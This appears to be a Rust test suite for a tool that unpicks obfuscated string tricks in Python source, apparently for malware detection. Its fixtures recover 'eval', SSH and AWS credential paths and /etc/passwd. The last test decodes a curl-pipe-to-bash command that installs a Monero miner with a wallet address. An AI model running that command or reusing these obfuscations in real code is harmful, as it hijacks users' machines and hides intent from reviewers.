use crate::indexer::index::NodeIndexer;
use crate::indexer::locator::Locator;
use crate::indexer::node_transformer::NodeTransformer;
use ruff_python_ast::visitor::source_order::*;
use ruff_python_ast::visitor::transformer::Transformer;
use ruff_python_ast::*;
use ruff_text_size::TextRange;
use unindent::unindent;

macro_rules! string_item {
    ($string:expr, $start:expr, $end:expr) => {
        StringItem {
            string: $string.to_string(),
            location: TextRange::new($start.into(), $end.into()),
        }
    };
}

#[derive(Debug, PartialEq)]
pub struct StringItem {
    pub string: String,
    pub location: TextRange,
}
pub struct StringVisitor {
    pub strings: Vec<StringItem>,
}
impl StringVisitor {
    pub fn new() -> Self {
        Self { strings: vec![] }
    }
}
impl<'a> SourceOrderVisitor<'a> for StringVisitor {
    fn visit_string_literal(&mut self, string_literal: &'a StringLiteral) {
        self.strings.push(StringItem {
            string: string_literal.value.to_string(),
            location: string_literal.range,
        });
        walk_string_literal(self, string_literal);
    }
}

fn get_strings(source: &str) -> Vec<StringItem> {
    let parsed = ruff_python_parser::parse_unchecked_source(source, PySourceType::Python);
    let locator = Locator::new(source);
    let python_ast = parsed.suite();

    let mut indexer = NodeIndexer::new();
    indexer.visit_body(python_ast);
    let mut transformed_ast = python_ast.to_vec();
    let transformer = NodeTransformer::new(&locator, indexer);
    transformer.visit_body(&mut transformed_ast);
    let mut visitor = StringVisitor::new();
    visitor.visit_body(&transformed_ast);
    visitor.strings
}

#[test]
fn test_string_concatenation() {
    let source = r#"a = "print"+"(123)"+";"+"123""#;
    let expected = vec![string_item!("print(123);123", 4, 29)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_string_interpolation() {
    let source = r#"a = f"print({a},{b})""#;
    let expected = vec![string_item!("print({a},{b})", 4, 21)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_fstring_variable_replacement_simple() {
    let source = unindent(
        r#"
        a = "world"
        s = f"hello {a}"
    "#,
    );
    let actual = get_strings(&source);
    assert!(actual.iter().any(|it| it.string == "world"));
    assert!(actual.iter().any(|it| it.string == "hello world"));
}

#[test]
fn test_fstring_multiple_variable_replacement() {
    let source = unindent(
        r#"
        a = "A"
        b = "B"
        s = f"{a}-{b}"
    "#,
    );
    let actual = get_strings(&source);
    assert!(actual.iter().any(|it| it.string == "A"));
    assert!(actual.iter().any(|it| it.string == "B"));
    assert!(actual.iter().any(|it| it.string == "A-B"));
}

#[test]
fn test_join_on_list() {
    let source = r#"a = "".join(["te","st"])"#;
    let expected = vec![string_item!("test", 4, 24)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}
#[test]
fn test_join_on_tuple() {
    let source = r#"a = "".join(("te","st", "ing"))"#;
    let expected = vec![string_item!("testing", 4, 31)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_join_with_space_delimiter() {
    let source = r#"a = " ".join(["te","st"])"#;
    let expected = vec![string_item!("te st", 4, 25)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_join_with_dash_delimiter_tuple() {
    let source = r#"a = "-".join(("a","b","c"))"#;
    let expected = vec![string_item!("a-b-c", 4, 27)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_reverse_slice_on_string() {
    let source = r#"a = "abc"[::-1]"#;
    let expected = vec![string_item!("cba", 4, 15)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_join_reversed_list() {
    let source = r#"a = "".join(reversed(["tion","mo"]))"#;
    let expected = vec![string_item!("motion", 4, 36)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_join_list_slice_reverse() {
    let source = r#"a = "".join(["a","b","c"][::-1])"#;
    let expected = vec![string_item!("cba", 4, 32)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_join_reversed_tuple_with_delim() {
    let source = r#"a = "-".join(reversed(("a","b","c")))"#;
    let expected = vec![string_item!("c-b-a", 4, 37)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_join_reversed_string_with_delim() {
    let source = r#"a = ".".join(reversed("ab"))"#;
    let expected = vec![string_item!("b.a", 4, 28)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_join_string_slice_reverse_with_delim() {
    let source = r#"a = ".".join("ab"[::-1])"#;
    let expected = vec![string_item!("b.a", 4, 24)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_decode_on_string_literal() {
    let source = r#"a = "hello".decode("utf-8")"#;
    let expected = vec![string_item!("hello", 4, 27)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_decode_on_concatenated_string() {
    let source = r#"a = ("he"+"llo").decode("utf-8")"#;
    let expected = vec![string_item!("hello", 4, 32)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_decode_with_no_args() {
    let source = r#"a = b"x".decode()"#;
    let expected = vec![string_item!("x", 4, 17)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_join_with_variables() {
    let source = unindent(
        r#"
         a = "cool"
         c = "".join(["the_",a, "_string"])
    "#,
    );
    let expected = vec![
        string_item!("cool", 4, 10),
        string_item!("the_cool_string", 15, 45),
    ];
    let actual = get_strings(&source);
    assert_eq!(expected, actual);
}

#[test]
fn test_collection_mutations() {
    let source = unindent(
        r#"
        parts = []
        parts.append("l")
        parts.append("a")
        parts.append("v")
        parts.append("e")
        parts.reverse()
        func_name = "".join(parts)
    "#,
    );
    let actual = get_strings(&source);
    assert!(actual.iter().any(|it| it.string == "eval"));
}

#[test]
fn test_collection_insert() {
    let source = unindent(
        r#"
        parts = ["a", "l"]
        parts.insert(0, "v")
        parts.insert(0, "e")
        func_name = "".join(parts)
    "#,
    );
    let actual = get_strings(&source);
    assert!(actual.iter().any(|it| it.string == "eval"));
}

#[test]
fn test_chr_plus_one_generator() {
    let source = r#"a = "".join(chr(x + 1) for x in [100, 117, 96, 107])"#;
    let actual = get_strings(source);
    assert!(actual.iter().any(|it| it.string == "eval"));
}

#[test]
fn test_join_var() {
    let source = unindent(
        r#"
         a = ["the_", "cool", "_string"]
         c = "".join(a)
    "#,
    );
    let expected = vec![
        string_item!("the_", 5, 11),
        string_item!("cool", 13, 19),
        string_item!("_string", 21, 30),
        string_item!("the_cool_string", 36, 46),
    ];
    let actual = get_strings(&source);
    assert_eq!(expected, actual);
}

#[test]
fn test_os_path_join() {
    let source = r#"a = os.path.join("~/.ssh", "id_rsa")"#;
    let expected = vec![string_item!("~/.ssh/id_rsa", 4, 36)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_os_path_expanduser_bytes() {
    let source = r#"a = os.path.expanduser(b"~")"#;
    let expected = vec![string_item!("~", 4, 28)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_os_path_expanduser_keyword() {
    let source = r#"a = os.path.expanduser(path="~")"#;
    let expected = vec![string_item!("~", 4, 32)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_os_path_expanduser_variable() {
    let source = unindent(
        r#"
        p = "~"
        a = os.path.expanduser(p)
    "#,
    );
    let actual = get_strings(&source);
    assert!(actual.iter().any(|it| it.string == "~"));
}

#[test]
fn test_os_path_expanduser_with_path() {
    let source = r#"a = os.path.expanduser("~/foo")"#;
    let expected = vec![string_item!("~/foo", 4, 31)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_os_path_expanduser() {
    let source = r#"a = os.path.expanduser("~")"#;
    let expected = vec![string_item!("~", 4, 27)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_os_path_join_with_expanduser() {
    let source = r#"a = os.path.join(os.path.expanduser("~"), ".aws", "credentials")"#;
    let expected = vec![string_item!("~/.aws/credentials", 4, 64)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_binascii_unhexlify() {
    let source = r#"a = binascii.unhexlify("414243")"#;
    let actual = get_strings(source);
    assert!(actual.iter().any(|it| it.string == "\\x41\\x42\\x43"));
}

#[test]
fn test_bytes_fromhex_with_spaces() {
    let source = r#"a = bytes.fromhex("41 42 43")"#;
    let actual = get_strings(source);
    assert!(actual.iter().any(|it| it.string == "\\x41\\x42\\x43"));
}

#[test]
fn test_join_map_chr_list() {
    let source = r#"a = "".join(map(chr, [97, 98, 99]))"#;
    let expected = vec![string_item!("abc", 4, 35)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_join_generator_chr_tuple() {
    let source = r#"a = "".join(chr(x) for x in (65, 66))"#;
    let expected = vec![string_item!("AB", 4, 37)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

pub struct NameVisitor {
    pub names: Vec<String>,
}
impl NameVisitor {
    pub fn new() -> Self {
        Self { names: vec![] }
    }
}
impl<'a> SourceOrderVisitor<'a> for NameVisitor {
    fn visit_expr(&mut self, expr: &'a Expr) {
        match expr {
            Expr::Name(name) => self.names.push(name.id.to_string()),
            Expr::Attribute(attr) => self.names.push(attr.attr.to_string()),
            _ => {}
        }
        walk_expr(self, expr);
    }
}

#[test]
fn test_builtins_getattr_to_name() {
    let source = r#"cc = __builtins__.getattr(__builtins__, b"\x85\xa5\x81\x93".decode("cp1026"))"#;
    let parsed = ruff_python_parser::parse_unchecked_source(source, PySourceType::Python);
    let locator = Locator::new(source);
    let python_ast = parsed.suite();

    let mut indexer = NodeIndexer::new();
    indexer.visit_body(python_ast);
    let mut transformed_ast = python_ast.to_vec();
    let transformer = NodeTransformer::new(&locator, indexer);
    transformer.visit_body(&mut transformed_ast);

    let mut visitor = NameVisitor::new();
    visitor.visit_body(&transformed_ast);
    assert!(visitor.names.contains(&"eval".to_string()));
}

#[test]
fn test_getattr_builtins_to_name() {
    let source = r#"getattr(builtins, "eval")"#;
    let parsed = ruff_python_parser::parse_unchecked_source(source, PySourceType::Python);
    let locator = Locator::new(source);
    let python_ast = parsed.suite();

    let mut indexer = NodeIndexer::new();
    indexer.visit_body(python_ast);
    let mut transformed_ast = python_ast.to_vec();
    let transformer = NodeTransformer::new(&locator, indexer);
    transformer.visit_body(&mut transformed_ast);

    let mut visitor = NameVisitor::new();
    visitor.visit_body(&transformed_ast);
    assert!(visitor.names.contains(&"eval".to_string()));
}

#[test]
fn test_base64_decode() {
    let source = r#"
import base64
import binascii
a = base64.b64decode("ZXZhbA==").decode()
b = base64.urlsafe_b64decode("ZXZhbA==").decode()
c = binascii.a2b_base64("ZXZhbA==").decode()
"#;
    let actual = get_strings(source);
    assert!(actual.iter().any(|it| it.string == "eval"));
}

#[test]
fn test_decode_cp1026() {
    let source = r#"a = b"\x85\xa5\x81\x93".decode("cp1026")"#;
    let expected = vec![string_item!("eval", 4, 40)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_bytes_decode() {
    let source = r#"a = bytes([98, 97, 115, 104]).decode()"#;
    let expected = vec![string_item!("bash", 4, 38)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_decode_latin1() {
    let source = r#"a = b"\xff".decode("iso-8859-1")"#;
    let expected = vec![string_item!("\u{ff}", 4, 32)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_decode_utf16() {
    let source = r#"a = b"\x00A\x00B\x00C".decode("utf-16be")"#;
    let expected = vec![string_item!("ABC", 4, 41)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_decode_mixed_escapes() {
    let source = r#"a = b"A\x42C\n".decode("utf-8")"#;
    let expected = vec![string_item!("ABC\n", 4, 31)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_decode_shift_jis() {
    let source = r#"a = b"\x82\xa0\x82\xa2\x82\xa4\x82\xa6\x82\xa8".decode("shift_jis")"#;
    let expected = vec![string_item!("あいうえお", 4, 67)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_decode_utf8_multibyte() {
    let source = r#"a = b"\xf0\x9f\x9a\x80".decode("utf-8")"#;
    let expected = vec![string_item!("🚀", 4, 39)];
    let actual = get_strings(source);
    assert_eq!(expected, actual);
}

#[test]
fn test_complex_obfuscation() {
    let source = unindent(
        r##"
        l = "p# y-:!-:Y-u}!G<< n%;tv\"u#o#!r p|{\"r{\";p|z<Z|{r |\prn{<&z vtl!r\"#}<zn!\"r <!r\"#}lz|{r ||prn{lzv{r ;!u-*-on!u-:!-EB~?}nON_{EC[#xQST|O>fDxbOBTz!N\"vO[ub&pB[f%\"vPZ#o\"\"a%DcTUC>Q$FpB%$[cf>rNweNxgF^T$Ap~t? QCYDv(`#"
        h = "".join([chr(((ord(c) - 32 - 13) % 95) + 32) for c in l])
        f = "".join([chr(x) for x in [47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100]])
        r = "".join([chr(x) for x in [104, 111, 109, 101]])
        p = "".join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])
    "##,
    );
    let actual = get_strings(&source);
    assert!(actual.iter().any(|it| it.string == "curl -s -L hps://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 85q2paBARn86NukDFGoB1Y7kUB5GmsAtiBNhUxc5NYwtiCMubttTw7VGH61Dv9c5wvNVY1eAjXAkZ9QGv4cqg2rD6L7izSu"));
    assert!(actual.iter().any(|it| it.string == "/etc/passwd"));
    assert!(actual.iter().any(|it| it.string == "home"));
    assert!(actual.iter().any(|it| it.string == ".profile"));
}
